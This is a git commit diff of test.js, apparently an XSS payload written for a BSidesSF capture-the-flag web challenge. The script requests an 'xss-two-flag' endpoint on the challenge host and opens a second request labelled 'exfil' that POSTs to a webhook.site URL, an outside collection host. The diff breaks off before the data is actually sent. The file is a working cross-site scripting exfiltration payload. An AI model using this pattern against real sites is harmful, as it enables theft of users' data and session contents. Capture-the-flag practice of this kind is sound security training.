f51e5968b089b23678f517b00f91992bf4feeac8
sote-CJ <51846573+sote-CJ@users.noreply.github.com>
2026-03-21 08:53:43 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open('GET', '/xss-two-flag', true);
+xhr.open('GET', 'https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag', true);
 xhr.onload = function() {
     var exfil = new XMLHttpRequest();
     exfil.open('POST', 'https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/', true);
